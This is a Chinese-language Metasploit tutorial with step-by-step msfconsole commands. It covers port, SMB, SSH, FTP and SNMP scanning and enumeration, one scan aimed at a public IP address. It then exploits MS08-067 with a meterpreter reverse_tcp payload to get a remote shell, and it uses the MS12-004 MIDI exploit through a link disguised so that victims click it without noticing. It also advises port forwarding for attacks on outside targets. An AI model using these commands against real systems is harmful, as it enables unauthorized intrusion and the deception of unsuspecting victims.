一、调用Nmap进行扫描

进入msf命令行后直接输入nmap –v –sVip(具体命令和nmap一样)

  

二、MSF模块扫描

Use auxiliary/scanner/postscan/syn

先用搜索命令搜索有关端口扫描的工具：searchportscan

我们使用Use auxiliary/scanner/postscan/syn

看一下参数配置 showoptions

![](../Images/0260fb9857af090ac5a7f0aad21b72e4.png)  

我们先来设置一下网卡

Set INTERFACE eth0

设置一下扫描的端口，我们这里来扫描80：set PORTS 80

设置扫描目标RHOSTS ：set RHOSTS 119.63.37.149

在设置一下线程：set THREADS 100

看一下我们设置好的

![](../Images/697c9706349bc21b2e32c28b4de839af.png)  

这时候我们都设置好了，我们来攻击下，看看效果，用命令run进行攻击

缺点就是扫描的速度有点慢啊

 

MetaSploit SMB扫描获取系统信息

还是搜索一下smb：searchsmb

![](../Images/b7b4df06a6ab38eb484d39130c603ad1.png)  

这次发现搜出来很多，我们用这个模块

Use auxiliary/scanner/smb/smb\_version

看一下需要设置的参数

![](../Images/2f94559a86cd4282a3159969f07251b4.png)  

设定目标ip：set RHOSTS 192.168.188.140

在设置一下线程：set THREAD 10 

然后run一下，查看结果

  
直接扫描出来小伙伴的系统还有主机名，速度不到1s，很快

也可以批量扫描设置批量扫描目标即可 set RHOSTS 192.168.188.50-200

  

MetaSploit服务识别

我们这里对SSH和FTP进行识别

在这里使用这个模块：use auxiliary/scanner/ssh/ssh\_version   

然后我们设置一下参数，这里讲设置好的参数截图看一下

![](../Images/fcbd9ad75766e2444456a57208fe2cf2.png)  

Run一下看看结果，其实没有扫出来，好像是屏蔽了，但是用nmap却扫出来了ssh

![](../Images/d2d02601531c759b32b30d98863e2043.png)  

在试一下ftp，用这个模块：use auxiliary/scanner/ftp/ftp\_version

设置下参数

![](../Images/35fbc4e36a9d11e6efd05f19d0534033.png)  
可以看到结果，也没有扫描出来；

 MetaSploit SNMP扫描与枚举

搜索一下snmpuse auxiliary/scanner/snmp/snmp\_login

看一下他的参数设置

![](../Images/5e984c60374a7733cf3d331da2d9ead2.png)  

这个参数还是很多的

设定一下目标

然后在run一下

枚举用这个模块

use auxiliary/scanner/snmp/snmp\_enum

![](../Images/9502370dfce9daaa12fe42ed4ad0ecce.png)  

设置好目标和线程后run一下就可以

  

MetaSploit远程代码执行

搜索一下08-067，使用这个攻击载荷

use exploit/windows/smb/ms08\_067\_netapi

同样来看一下参数设置

![](../Images/aed002533e5c294bd8a33a7546619aff.png)  

我们只要设置一下目标就可以，然后我们需要一个载荷来反弹shell

set payload windows/meterpreter/reverse\_tcp

然后设置参数

![](../Images/e6d57af8ecdc01dd8381dca429aea50a.png)  

将LHOST 设置为自己的ip（对外攻击不要忘了段口转发）

比如说知道对面的系统是什么版本，可以指定targer，用target查看一下都有什么版本

![](../Images/bf7b1fd84aca799e0777a4ad447c03ff.png)  

设置一下目标，假设我们目标机器的系统为10：set target 10

这时候，我们再来看一下其参数设置，发现比以前完备了好多

![](../Images/c6e463466cbf942b28ef64f24750c58f.png)  

08-067是不会自动识别系统版本的，但是其他的可以自动识别，所以用其他攻击载荷的时候可以不用设置

然后输入exploit进行攻击即可

这时候会出来一个meterpreter>

我们在里面输入shell，就会反弹一个shell

这样整个攻击过程就完成了

 

 

MetaSploit MIDI文件解析远程代码执行

还是来搜索12-004

![](../Images/30eb18dc8251f75636a577680d368163.png)  

设置下本机ip   set SRVHOST  ip

然后攻击

![](../Images/12e0ce0bcb93edff20c4b770ce98d34a.png)  

会生成一个连接，但是这个链接容易让人发现，所以我们可以伪装下ip利用URIPATH参数就可以伪装

在设置时，会发现报红，因为4444端口被占用了，所以我们改下监听端口 set LPORT 5555

然后生成连接

![](../Images/89d6ce06654c6d993866898dbdf3a630.png)  

只要目标点了这个链接，那么我们就会上线一个shell

说一下，目标点击后我们这边并没有反映，我们需要输下session查看当前会话，会找到上线的机子，连接上线的机子

Session –I 1（id）

然后输入shell就可以拿到shell
